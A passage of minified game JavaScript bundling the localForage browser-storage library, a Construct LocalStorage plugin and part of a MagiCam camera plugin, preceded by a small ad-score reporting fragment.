							    let ss = Math.floor ((curTime - adManager.lastStartTime) / 1000);
							    console.log(6666666666666,ss - 1,i);
								adManager.reportScore(ss -1);
                                adManager.inPlaying = false;
								// if (i > 0)
                                // {
                                //     throw  ee;
                                // }
							}
                            var s = this;
                            "string" != typeof e && (t.console.warn(e + " used as a key, but it is not a string."), e = String(e));
                            var o = new Promise((function (t, r) {
                                var o;
                                s.ready().then((function () {
                                    return o = s._dbInfo, i instanceof Blob ? n(o.db).then((function (t) {
                                        return t ? i : function (t) {
                                            return new Promise((function (e, i) {
                                                var n = new FileReader;
                                                n.onerror = i, n.onloadend = function (i) {
                                                    var n = btoa(i.target.result || "");
                                                    e({
                                                        __local_forage_encoded_blob: !0,
                                                        data: n,
                                                        type: t.type
                                                    })
                                                }, n.readAsBinaryString(t)
                                            }))
                                        }(i)
                                    })) : i
                                })).then((function (i) {
                                    var n = o.db.transaction(o.storeName, "readwrite"),
                                        s = n.objectStore(o.storeName);
                                    null === i && (i = void 0), n.oncomplete = function () {
                                        void 0 === i && (i = null), t(i)
                                    }, n.onabort = n.onerror = function () {
                                        var t = a.error ? a.error : a.transaction.error;
                                        r(t)
                                    };
                                    var a = s.put(i, e)
                                })).catch(r)
                            }));
                            return c(o, r), o
                        },
                        removeItem: function (e, i) {
                            var n = this;
                            "string" != typeof e && (t.console.warn(e + " used as a key, but it is not a string."), e = String(e));
                            var r = new Promise((function (t, i) {
                                n.ready().then((function () {
                                    var r = n._dbInfo,
                                        s = r.db.transaction(r.storeName, "readwrite"),
                                        o = s.objectStore(r.storeName).delete(e);
                                    s.oncomplete = function () {
                                        t()
                                    }, s.onerror = function () {
                                        i(o.error)
                                    }, s.onabort = function () {
                                        var t = o.error ? o.error : o.transaction.error;
                                        i(t)
                                    }
                                })).catch(i)
                            }));
                            return c(r, i), r
                        },
                        clear: function (t) {
                            var e = this,
                                i = new Promise((function (t, i) {
                                    e.ready().then((function () {
                                        var n = e._dbInfo,
                                            r = n.db.transaction(n.storeName, "readwrite"),
                                            s = r.objectStore(n.storeName).clear();
                                        r.oncomplete = function () {
                                            t()
                                        }, r.onabort = r.onerror = function () {
                                            var t = s.error ? s.error : s.transaction.error;
                                            i(t)
                                        }
                                    })).catch(i)
                                }));
                            return c(i, t), i
                        },
                        length: function (t) {
                            var e = this,
                                i = new Promise((function (t, i) {
                                    e.ready().then((function () {
                                        var n = e._dbInfo,
                                            r = n.db.transaction(n.storeName, "readonly").objectStore(n.storeName).count();
                                        r.onsuccess = function () {
                                            t(r.result)
                                        }, r.onerror = function () {
                                            i(r.error)
                                        }
                                    })).catch(i)
                                }));
                            return c(i, t), i
                        },
                        key: function (t, e) {
                            var i = this,
                                n = new Promise((function (e, n) {
                                    return 0 > t ? void e(null) : void i.ready().then((function () {
                                        var r = i._dbInfo,
                                            s = r.db.transaction(r.storeName, "readonly").objectStore(r.storeName),
                                            o = !1,
                                            a = s.openCursor();
                                        a.onsuccess = function () {
                                            var i = a.result;
                                            return i ? void(0 === t || o ? e(i.key) : (o = !0, i.advance(t))) : void e(null)
                                        }, a.onerror = function () {
                                            n(a.error)
                                        }
                                    })).catch(n)
                                }));
                            return c(n, e), n
                        },
                        keys: function (t) {
                            var e = this,
                                i = new Promise((function (t, i) {
                                    e.ready().then((function () {
                                        var n = e._dbInfo,
                                            r = n.db.transaction(n.storeName, "readonly").objectStore(n.storeName).openCursor(),
                                            s = [];
                                        r.onsuccess = function () {
                                            var e = r.result;
                                            return e ? (s.push(e.key), void e.continue()) : void t(s)
                                        }, r.onerror = function () {
                                            i(r.error)
                                        }
                                    })).catch(i)
                                }));
                            return c(i, t), i
                        }
                    }
                }
            }("undefined" != typeof window ? window : self);
            e.default = i, t.exports = e.default
        }, function (t, e, i) {
            "use strict";
            e.__esModule = !0;
            var n = function (t) {
                function e(t, e) {
                    e && t.then((function (t) {
                        e(null, t)
                    }), (function (t) {
                        e(t)
                    }))
                }
                var n = null;
                try {
                    if (!t.localStorage || !("setItem" in t.localStorage)) return;
                    n = t.localStorage
                } catch (t) {
                    return
                }
                return {
                    _driver: "localStorageWrapper",
                    _initStorage: function (t) {
                        var e = {};
                        if (t)
                            for (var n in t) e[n] = t[n];
                        return e.keyPrefix = e.name + "/", e.storeName !== this._defaultConfig.storeName && (e.keyPrefix += e.storeName + "/"), this._dbInfo = e, new Promise((function (t, e) {
                            t(i(3))
                        })).then((function (t) {
                            return e.serializer = t, Promise.resolve()
                        }))
                    },
                    iterate: function (t, i) {
                        var r = this,
                            s = r.ready().then((function () {
                                for (var e = r._dbInfo, i = e.keyPrefix, s = i.length, o = n.length, a = 1, h = 0; o > h; h++) {
                                    var c = n.key(h);
                                    if (0 === c.indexOf(i)) {
                                        var l = n.getItem(c);
                                        if (l && (l = e.serializer.deserialize(l)), void 0 !== (l = t(l, c.substring(s), a++))) return l
                                    }
                                }
                            }));
                        return e(s, i), s
                    },
                    getItem: function (i, r) {
                        var s = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var o = s.ready().then((function () {
                            var t = s._dbInfo,
                                e = n.getItem(t.keyPrefix + i);
                            return e && (e = t.serializer.deserialize(e)), e
                        }));
                        return e(o, r), o
                    },
                    setItem: function (i, r, s) {
                        var o = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var a = o.ready().then((function () {
                            void 0 === r && (r = null);
                            var t = r;
                            return new Promise((function (e, s) {
                                var a = o._dbInfo;
                                a.serializer.serialize(r, (function (r, o) {
                                    if (o) s(o);
                                    else try {
                                        n.setItem(a.keyPrefix + i, r), e(t)
                                    } catch (t) {
                                        ("QuotaExceededError" === t.name || "NS_ERROR_DOM_QUOTA_REACHED" === t.name) && s(t), s(t)
                                    }
                                }))
                            }))
                        }));
                        return e(a, s), a
                    },
                    removeItem: function (i, r) {
                        var s = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var o = s.ready().then((function () {
                            var t = s._dbInfo;
                            n.removeItem(t.keyPrefix + i)
                        }));
                        return e(o, r), o
                    },
                    clear: function (t) {
                        var i = this,
                            r = i.ready().then((function () {
                                for (var t = i._dbInfo.keyPrefix, e = n.length - 1; e >= 0; e--) {
                                    var r = n.key(e);
                                    0 === r.indexOf(t) && n.removeItem(r)
                                }
                            }));
                        return e(r, t), r
                    },
                    length: function (t) {
                        var i = this.keys().then((function (t) {
                            return t.length
                        }));
                        return e(i, t), i
                    },
                    key: function (t, i) {
                        var r = this,
                            s = r.ready().then((function () {
                                var e, i = r._dbInfo;
                                try {
                                    e = n.key(t)
                                } catch (t) {
                                    e = null
                                }
                                return e && (e = e.substring(i.keyPrefix.length)), e
                            }));
                        return e(s, i), s
                    },
                    keys: function (t) {
                        var i = this,
                            r = i.ready().then((function () {
                                for (var t = i._dbInfo, e = n.length, r = [], s = 0; e > s; s++) 0 === n.key(s).indexOf(t.keyPrefix) && r.push(n.key(s).substring(t.keyPrefix.length));
                                return r
                            }));
                        return e(r, t), r
                    }
                }
            }("undefined" != typeof window ? window : self);
            e.default = n, t.exports = e.default
        }, function (t, e) {
            "use strict";
            e.__esModule = !0;
            var i = function (t) {
                function e(e, i) {
                    e = e || [], i = i || {};
                    try {
                        return new Blob(e, i)
                    } catch (s) {
                        if ("TypeError" !== s.name) throw s;
                        for (var n = new(t.BlobBuilder || t.MSBlobBuilder || t.MozBlobBuilder || t.WebKitBlobBuilder), r = 0; r < e.length; r += 1) n.append(e[r]);
                        return n.getBlob(i.type)
                    }
                }

                function i(t) {
                    var e, i, n, s, o, a = .75 * t.length,
                        h = t.length,
                        c = 0;
                    "=" === t[t.length - 1] && (a--, "=" === t[t.length - 2] && a--);
                    var l = new ArrayBuffer(a),
                        u = new Uint8Array(l);
                    for (e = 0; h > e; e += 4) i = r.indexOf(t[e]), n = r.indexOf(t[e + 1]), s = r.indexOf(t[e + 2]), o = r.indexOf(t[e + 3]), u[c++] = i << 2 | n >> 4, u[c++] = (15 & n) << 4 | s >> 2, u[c++] = (3 & s) << 6 | 63 & o;
                    return l
                }

                function n(t) {
                    var e, i = new Uint8Array(t),
                        n = "";
                    for (e = 0; e < i.length; e += 3) n += r[i[e] >> 2], n += r[(3 & i[e]) << 4 | i[e + 1] >> 4], n += r[(15 & i[e + 1]) << 2 | i[e + 2] >> 6], n += r[63 & i[e + 2]];
                    return i.length % 3 == 2 ? n = n.substring(0, n.length - 1) + "=" : i.length % 3 == 1 && (n = n.substring(0, n.length - 2) + "=="), n
                }
                var r = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
                    s = "~~local_forage_type~",
                    o = /^~~local_forage_type~([^~]+)~/,
                    a = "__lfsc__:",
                    h = a.length,
                    c = "arbf",
                    l = "blob",
                    u = "si08",
                    p = "ui08",
                    d = "uic8",
                    f = "si16",
                    m = "si32",
                    g = "ur16",
                    y = "ui32",
                    _ = "fl32",
                    v = "fl64",
                    b = h + c.length;
                return {
                    serialize: function (t, e) {
                        var i = "";
                        if (t && (i = t.toString()), t && ("[object ArrayBuffer]" === t.toString() || t.buffer && "[object ArrayBuffer]" === t.buffer.toString())) {
                            var r, o = a;
                            t instanceof ArrayBuffer ? (r = t, o += c) : (r = t.buffer, "[object Int8Array]" === i ? o += u : "[object Uint8Array]" === i ? o += p : "[object Uint8ClampedArray]" === i ? o += d : "[object Int16Array]" === i ? o += f : "[object Uint16Array]" === i ? o += g : "[object Int32Array]" === i ? o += m : "[object Uint32Array]" === i ? o += y : "[object Float32Array]" === i ? o += _ : "[object Float64Array]" === i ? o += v : e(new Error("Failed to get type for BinaryArray"))), e(o + n(r))
                        } else if ("[object Blob]" === i) {
                            var h = new FileReader;
                            h.onload = function () {
                                var i = s + t.type + "~" + n(this.result);
                                e(a + l + i)
                            }, h.readAsArrayBuffer(t)
                        } else try {
                            e(JSON.stringify(t))
                        } catch (t) {
                            e(null, t)
                        }
                    },
                    deserialize: function (t) {
                        if (t.substring(0, h) !== a) return JSON.parse(t);
                        var n, r = t.substring(b),
                            s = t.substring(h, b);
                        if (s === l && o.test(r)) {
                            var w = r.match(o);
                            n = w[1], r = r.substring(w[0].length)
                        }
                        var x = i(r);
                        switch (s) {
                            case c:
                                return x;
                            case l:
                                return e([x], {
                                    type: n
                                });
                            case u:
                                return new Int8Array(x);
                            case p:
                                return new Uint8Array(x);
                            case d:
                                return new Uint8ClampedArray(x);
                            case f:
                                return new Int16Array(x);
                            case g:
                                return new Uint16Array(x);
                            case m:
                                return new Int32Array(x);
                            case y:
                                return new Uint32Array(x);
                            case _:
                                return new Float32Array(x);
                            case v:
                                return new Float64Array(x);
                            default:
                                throw new Error("Unkown type: " + s)
                        }
                    },
                    stringToBuffer: i,
                    bufferToString: n
                }
            }("undefined" != typeof window ? window : self);
            e.default = i, t.exports = e.default
        }, function (t, e, i) {
            "use strict";
            e.__esModule = !0;
            var n = function (t) {
                function e(t, e) {
                    e && t.then((function (t) {
                        e(null, t)
                    }), (function (t) {
                        e(t)
                    }))
                }
                var n = t.openDatabase;
                if (n) return {
                    _driver: "webSQLStorage",
                    _initStorage: function (t) {
                        var e = this,
                            r = {
                                db: null
                            };
                        if (t)
                            for (var s in t) r[s] = "string" != typeof t[s] ? t[s].toString() : t[s];
                        var o = new Promise((function (t, i) {
                            try {
                                r.db = n(r.name, String(r.version), r.description, r.size)
                            } catch (t) {
                                return i(t)
                            }
                            r.db.transaction((function (n) {
                                n.executeSql("CREATE TABLE IF NOT EXISTS " + r.storeName + " (id INTEGER PRIMARY KEY, key unique, value)", [], (function () {
                                    e._dbInfo = r, t()
                                }), (function (t, e) {
                                    i(e)
                                }))
                            }))
                        }));
                        return new Promise((function (t, e) {
                            t(i(3))
                        })).then((function (t) {
                            return r.serializer = t, o
                        }))
                    },
                    iterate: function (t, i) {
                        var n = this,
                            r = new Promise((function (e, i) {
                                n.ready().then((function () {
                                    var r = n._dbInfo;
                                    r.db.transaction((function (n) {
                                        n.executeSql("SELECT * FROM " + r.storeName, [], (function (i, n) {
                                            for (var s = n.rows, o = s.length, a = 0; o > a; a++) {
                                                var h = s.item(a),
                                                    c = h.value;
                                                if (c && (c = r.serializer.deserialize(c)), void 0 !== (c = t(c, h.key, a + 1))) return void e(c)
                                            }
                                            e()
                                        }), (function (t, e) {
                                            i(e)
                                        }))
                                    }))
                                })).catch(i)
                            }));
                        return e(r, i), r
                    },
                    getItem: function (i, n) {
                        var r = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var s = new Promise((function (t, e) {
                            r.ready().then((function () {
                                var n = r._dbInfo;
                                n.db.transaction((function (r) {
                                    r.executeSql("SELECT * FROM " + n.storeName + " WHERE key = ? LIMIT 1", [i], (function (e, i) {
                                        var r = i.rows.length ? i.rows.item(0).value : null;
                                        r && (r = n.serializer.deserialize(r)), t(r)
                                    }), (function (t, i) {
                                        e(i)
                                    }))
                                }))
                            })).catch(e)
                        }));
                        return e(s, n), s
                    },
                    setItem: function (i, n, r) {
                        var s = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var o = new Promise((function (t, e) {
                            s.ready().then((function () {
                                void 0 === n && (n = null);
                                var r = n,
                                    o = s._dbInfo;
                                o.serializer.serialize(n, (function (n, s) {
                                    s ? e(s) : o.db.transaction((function (s) {
                                        s.executeSql("INSERT OR REPLACE INTO " + o.storeName + " (key, value) VALUES (?, ?)", [i, n], (function () {
                                            t(r)
                                        }), (function (t, i) {
                                            e(i)
                                        }))
                                    }), (function (t) {
                                        t.code === t.QUOTA_ERR && e(t)
                                    }))
                                }))
                            })).catch(e)
                        }));
                        return e(o, r), o
                    },
                    removeItem: function (i, n) {
                        var r = this;
                        "string" != typeof i && (t.console.warn(i + " used as a key, but it is not a string."), i = String(i));
                        var s = new Promise((function (t, e) {
                            r.ready().then((function () {
                                var n = r._dbInfo;
                                n.db.transaction((function (r) {
                                    r.executeSql("DELETE FROM " + n.storeName + " WHERE key = ?", [i], (function () {
                                        t()
                                    }), (function (t, i) {
                                        e(i)
                                    }))
                                }))
                            })).catch(e)
                        }));
                        return e(s, n), s
                    },
                    clear: function (t) {
                        var i = this,
                            n = new Promise((function (t, e) {
                                i.ready().then((function () {
                                    var n = i._dbInfo;
                                    n.db.transaction((function (i) {
                                        i.executeSql("DELETE FROM " + n.storeName, [], (function () {
                                            t()
                                        }), (function (t, i) {
                                            e(i)
                                        }))
                                    }))
                                })).catch(e)
                            }));
                        return e(n, t), n
                    },
                    length: function (t) {
                        var i = this,
                            n = new Promise((function (t, e) {
                                i.ready().then((function () {
                                    var n = i._dbInfo;
                                    n.db.transaction((function (i) {
                                        i.executeSql("SELECT COUNT(key) as c FROM " + n.storeName, [], (function (e, i) {
                                            var n = i.rows.item(0).c;
                                            t(n)
                                        }), (function (t, i) {
                                            e(i)
                                        }))
                                    }))
                                })).catch(e)
                            }));
                        return e(n, t), n
                    },
                    key: function (t, i) {
                        var n = this,
                            r = new Promise((function (e, i) {
                                n.ready().then((function () {
                                    var r = n._dbInfo;
                                    r.db.transaction((function (n) {
                                        n.executeSql("SELECT key FROM " + r.storeName + " WHERE id = ? LIMIT 1", [t + 1], (function (t, i) {
                                            var n = i.rows.length ? i.rows.item(0).key : null;
                                            e(n)
                                        }), (function (t, e) {
                                            i(e)
                                        }))
                                    }))
                                })).catch(i)
                            }));
                        return e(r, i), r
                    },
                    keys: function (t) {
                        var i = this,
                            n = new Promise((function (t, e) {
                                i.ready().then((function () {
                                    var n = i._dbInfo;
                                    n.db.transaction((function (i) {
                                        i.executeSql("SELECT key FROM " + n.storeName, [], (function (e, i) {
                                            for (var n = [], r = 0; r < i.rows.length; r++) n.push(i.rows.item(r).key);
                                            t(n)
                                        }), (function (t, i) {
                                            e(i)
                                        }))
                                    }))
                                })).catch(e)
                            }));
                        return e(n, t), n
                    }
                }
            }("undefined" != typeof window ? window : self);
            e.default = n, t.exports = e.default
        }])
    }))
} catch (t) {
    localForageInitFailed = !0
}
cr.plugins_.LocalStorage = function (t) {
        this.runtime = t
    },
    function () {
        var t = "",
            e = "",
            i = [],
            n = "";

        function r(t) {
            return t ? "string" == typeof t ? t : "string" == typeof t.message ? t.message : "string" == typeof t.name ? t.name : "string" == typeof t.data ? t.data : "unknown error" : "unknown error"
        }

        function s(t, e) {
            n = e, t.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, t)
        }
        var o = "",
            a = void 0 !== window.is_scirra_arcade;

        function h(t) {
            return !o || t.substr(0, o.length) === o
        }
        a && (o = "sa" + window.scirra_arcade_id + "_");
        var c = cr.plugins_.LocalStorage.prototype;
        c.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, c.Type.prototype.onCreate = function () {}, c.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var l = c.Instance.prototype;
        l.onCreate = function () {
            this.pendingSets = 0, this.pendingGets = 0
        }, l.onDestroy = function () {}, l.saveToJSON = function () {
            return {}
        }, l.loadFromJSON = function (t) {};

        function u() {}

        function p() {}

        function d() {}
        u.prototype.OnItemSet = function (e) {
            return t === e
        }, u.prototype.OnAnyItemSet = function () {
            return !0
        }, u.prototype.OnItemGet = function (e) {
            return t === e
        }, u.prototype.OnAnyItemGet = function () {
            return !0
        }, u.prototype.OnItemRemoved = function (e) {
            return t === e
        }, u.prototype.OnAnyItemRemoved = function () {
            return !0
        }, u.prototype.OnCleared = function () {
            return !0
        }, u.prototype.OnAllKeyNamesLoaded = function () {
            return !0
        }, u.prototype.OnError = function () {
            return !0
        }, u.prototype.OnItemExists = function (e) {
            return t === e
        }, u.prototype.OnItemMissing = function (e) {
            return t === e
        }, u.prototype.CompareKey = function (e, i) {
            return cr.do_cmp(t, e, i)
        }, u.prototype.CompareValue = function (t, i) {
            return cr.do_cmp(e, t, i)
        }, u.prototype.IsProcessingSets = function () {
            return this.pendingSets > 0
        }, u.prototype.IsProcessingGets = function () {
            return this.pendingGets > 0
        }, u.prototype.OnAllSetsComplete = function () {
            return !0
        }, u.prototype.OnAllGetsComplete = function () {
            return !0
        }, c.cnds = new u, p.prototype.SetItem = function (i, a) {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else {
                var h = o + i;
                this.pendingSets++;
                var c = this;
                localforage.setItem(h, a, (function (s, o) {
                    !0, c.pendingSets--, s ? (n = r(s), c.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, c)) : (t = i, e = o, c.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemSet, c), c.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemSet, c), t = "", e = ""), 0 === c.pendingSets && c.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllSetsComplete, c)
                }))
            }
        }, p.prototype.GetItem = function (i) {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else {
                var a = o + i;
                this.pendingGets++;
                var h = this;
                localforage.getItem(a, (function (s, o) {
                    h.pendingGets--, s ? (n = r(s), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, h)) : (t = i, null == (e = o) && (e = ""), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemGet, h), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemGet, h), t = "", e = ""), 0 === h.pendingGets && h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllGetsComplete, h)
                }))
            }
        }, p.prototype.CheckItemExists = function (i) {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else {
                var a = o + i,
                    h = this;
                localforage.getItem(a, (function (s, o) {
                    s ? (n = r(s), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, h)) : (t = i, null === o ? (e = "", h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemMissing, h)) : (e = o, h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemExists, h)), t = "", e = "")
                }))
            }
        }, p.prototype.RemoveItem = function (i) {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else {
                var a = o + i,
                    h = this;
                localforage.removeItem(a, (function (s) {
                    !0, s ? (n = r(s), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, h)) : (t = i, e = "", h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemRemoved, h), h.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemRemoved, h), t = "")
                }))
            }
        }, p.prototype.ClearStorage = function () {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else if (!a) {
                var o = this;
                localforage.clear((function (s) {
                    !0, s ? (n = r(s), o.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, o)) : (t = "", e = "", cr.clearArray(i), o.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnCleared, o))
                }))
            }
        }, p.prototype.GetAllKeyNames = function () {
            if (localForageInitFailed) s(this, "storage failed to initialise - may be disabled in browser settings");
            else {
                var t = this;
                localforage.keys((function (e, s) {
                    var a, c, l, u;
                    if (e) n = r(e), t.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError, t);
                    else {
                        for (cr.clearArray(i), a = 0, c = s.length; a < c; ++a) h(l = s[a]) && i.push((u = l, o ? h(u) ? u.substr(o.length) : void 0 : u));
                        t.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllKeyNamesLoaded, t)
                    }
                }))
            }
        }, c.acts = new p, d.prototype.ItemValue = function (t) {
            t.set_any(e)
        }, d.prototype.Key = function (e) {
            e.set_string(t)
        }, d.prototype.KeyCount = function (t) {
            t.set_int(i.length)
        }, d.prototype.KeyAt = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= i.length ? t.set_string("") : t.set_string(i[e])
        }, d.prototype.ErrorMessage = function (t) {
            t.set_string(n)
        }, c.exps = new d
    }(), cr.plugins_.MagiCam = function (t) {
        this.runtime = t
    },
    function () {
        var t = {};

        function e(t, e, i, n, r, s) {
            this.type = t, this.duration = e, this.param1 = i, this.param2 = n, this.param3 = r, this.param4 = s, this.progress = 0
        }

        function i(t, e, i, n, r) {
            this.global = r, this.name = t, this.x = e, this.y = i, this.scale = n, this.following = !1, this.followedObjects = [], this.followedObjectUIDs = [], this.objectWeights = [], this.followedObjectIPs = [], this.followLag = 1, this.zoomToContain = !1, this.zoomMarginH = 0, this.zoomMarginV = 0, this.zoomBoundU = -1, this.zoomBoundL = -1, this.transitions = [], this.moveTransFinished = !1, this.zoomTransFinished = !1, this.isShaking = !1, this.shakeX = 0, this.shakeY = 0, this.shakeZoom = 0, this.shakeTimer = 0, this.shakeStrength = 0, this.shakeMaxDeviation = 0, this.shakeMaxZoomDeviation = 0, this.shakeLength = 0, this.shakeBuildTime = 0, this.shakeDropTime = 0
        }
        t.lerp = function (t, e, i) {
            return t + (e - t) * i
        }, t.cubic = function (t, e, i, n, r) {
            return this.lerp(this.lerp(this.lerp(t, e, r), this.lerp(e, i, r), r), this.lerp(this.lerp(e, i, r), this.lerp(i, n, r), r), r)
        }, t.clamp = function (t, e, i) {
            return t < e ? e : t > i ? i : t
        }, i.prototype.GetName = function () {
            return this.name
        }, i.prototype.GetX = function () {
            return this.x
        }, i.prototype.SetX = function (t) {
            this.x = t
        }, i.prototype.GetY = function () {
            return this.y
        }, i.prototype.SetY = function (t) {
            this.y = t
        }, i.prototype.GetShakeX = function () {
            return this.shakeX
        }, i.prototype.GetShakeY = function () {
            return this.shakeY
        }, i.prototype.SetFollowedObject = function (t) {
            this.followedObject = t
        }, i.prototype.ShakeCamera = function (e) {
            if (this.isShaking)
                if (this.shakeTimer += e, this.shakeTimer < this.shakeLength) {
                    var i = 0;
                    i = this.shakeTimer < this.shakeBuildTime ? t.lerp(0, this.shakeStrength, this.shakeTimer / this.shakeBuildTime) : this.shakeStrength, this.shakeTimer > this.shakeDropTime && (i = t.lerp(this.shakeStrength, 0, (this.shakeTimer - this.shakeDropTime) / (this.shakeLength - this.shakeDropTime)));
                    var n = Math.floor(361 * Math.random()) / 57.2958,
                        r = t.lerp(0, Math.cos(n) * this.shakeMaxDeviation, i),
                        s = t.lerp(0, Math.sin(n) * this.shakeMaxDeviation, i),
                        o = t.lerp(0, Math.floor(201 * Math.random() - 100) / 100 * this.shakeMaxZoomDeviation, i);
                    this.shakeX = t.lerp(this.shakeX, r, i), this.shakeY = t.lerp(this.shakeY, s, i), this.shakeZoom = t.lerp(this.shakeZoom, o, i)
                } else this.isShaking = !1, this.shakeX = 0, this.shakeY = 0, this.shakeZoom = 0
        }, i.prototype.ProcessTransitions = function (e) {
            var i;
            this.moveTransFinished = !1, this.zoomTransFinished = !1;
            for (var n = 0; n < this.transitions.length;)(i = this.transitions[n]).progress = t.clamp(i.progress + 1 / i.duration * e, 0, 1), "MOVE" == i.type ? (this.x = t.cubic(i.param3, i.param3, i.param1, i.param1, i.progress), this.y = t.cubic(i.param4, i.param4, i.param2, i.param2, i.progress)) : "SCALE" == i.type && (this.scale = t.cubic(i.param2, i.param2, i.param1, i.param1, i.progress)), 1 == i.progress ? ("MOVE" == i.type ? this.moveTransFinished = !0 : "SCALE" == i.type && (this.zoomTransFinished = !0), this.transitions.splice(n, 1)) : n++
        }, i.prototype.UpdateCameraTarget = function (t, e) {
            for (var i = 0; i < this.transitions.length; i++) {
                var n = this.transitions[i];
                "MOVE" == n.type ? (n.param1 = e.GetX(), n.param2 = e.GetY()) : "SCALE" == n.type && (n.param1 = e.scale)
            }
        }, i.prototype.ProcessFollowing = function (e, i, n, r) {
            var s = this.followedObjects,
                o = this.followedObjectIPs;
            if (this.following && s.length > 0) {
                var a = 0,
                    h = 0,
                    c = 0;
                if (this.zoomToContain) {
                    var l = 0,
                        u = 0,
                        p = 0,
                        d = 0,
                        f = !1,
                        m = !1,
                        g = !1,
                        y = !1;
                    for (T = 0; T < s.length; T++) {
                        var _ = s[T];
                        _.update_bbox(), f ? l = Math.min(l, _.bbox.left) : (l = _.bbox.left, f = !0), m ? u = Math.max(u, _.bbox.right) : (u = _.bbox.right, m = !0), g ? p = Math.min(p, _.bbox.top) : (p = _.bbox.top, g = !0), y ? d = Math.max(d, _.bbox.bottom) : (d = _.bbox.bottom, y = !0)
                    }
                    var v = (i - 2 * this.zoomMarginH) / (u - l),
                        b = (n - 2 * this.zoomMarginV) / (d - p);
                    a = t.lerp(l, u, .5), h = t.lerp(p, d, .5), this.x < i / 2 / v && (a = i / (v = (i - this.zoomMarginH) / u) / 2), this.x > r.width - i / 2 / v && (v = (i - this.zoomMarginH) / (r.width - l), a = r.width - i / v / 2), this.y < n / 2 / b && (h = n / (b = (n - this.zoomMarginV) / d) / 2), this.y > r.height - n / 2 / b && (b = (n - this.zoomMarginV) / (r.height - p), h = r.height - n / b / 2), c = Math.min(v, b), -1 != this.zoomBoundL && c < this.zoomBoundL && (c = this.zoomBoundL), -1 != this.zoomBoundU && c > this.zoomBoundU && (c = this.zoomBoundU)
                } else {
                    for (var w = 0, x = 0, S = 0, T = 0; T < s.length; T++) w += s[T].getImagePoint(o[T], !0) * this.objectWeights[T], x += s[T].getImagePoint(o[T], !1) * this.objectWeights[T], S += this.objectWeights[T];
                    a = w / S, h = x / S
                }
                if (1 == this.followLag) this.x = a, this.y = h, this.zoomToContain && (this.scale = c);
                else {
                    var C = 4 * this.followLag * e * Math.sqrt(1 / e);
                    this.x = t.lerp(this.x, a, C), this.y = t.lerp(this.y, h, C), this.zoomToContain && (this.scale = t.lerp(this.scale, c, C))
                }
            }
        };
        var n = cr.plugins_.MagiCam.prototype;
        n.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, n.Type.prototype.onCreate = function () {}, n.Instance = function (t) {
            this.type = t, this.runtime = t.runtime, this.localCameras = [], this.localCameraCount = 0, this.localCameraCountOld = 0, this.transCamera = null, this.transTarget = null, this.isSwitchingCameras = !1, this.globalCameras = [], this.activeCamera = null
        };
        var r = n.Instance.prototype;

        function s() {}

        function o() {}

        function a() {}
        r.onCreate = function () {
            this.runtime.tickMe(this), this.my_timescale = -1
        }, r.saveToJSON = function () {
            null != this.transCamera && this.localCameras.push(this.transCamera);
            for (var t = {
                    lcc: this.localCameraCount,
                    olcc: this.localCameraCountOld,
                    alcc: this.localCameras.length,
                    agcc: this.globalCameras.length,
                    tcnn: null != this.transCamera
                }, e = 0; e < this.localCameras.length; e++) {
                t["lc" + e + "g"] = this.localCameras[e].global, t["lc" + e + "n"] = this.localCameras[e].name, t["lc" + e + "x"] = this.localCameras[e].x, t["lc" + e + "y"] = this.localCameras[e].y, t["lc" + e + "s"] = this.localCameras[e].scale, t["lc" + e + "f"] = this.localCameras[e].following, t["lc" + e + "foc"] = this.localCameras[e].followedObjects.length;
                for (var i = 0; i < this.localCameras[e].followedObjects.length; i++) t["lc" + e + "fo" + i] = this.localCameras[e].followedObjects[i].uid;
                for (var n = 0; n < this.localCameras[e].objectWeights.length; n++) t["lc" + e + "fow" + n] = this.localCameras[e].objectWeights[n];
                for (var r = 0; r < this.localCameras[e].followedObjectIPs.length; r++) t["lc" + e + "foip" + r] = this.localCameras[e].followedObjectIPs[r];
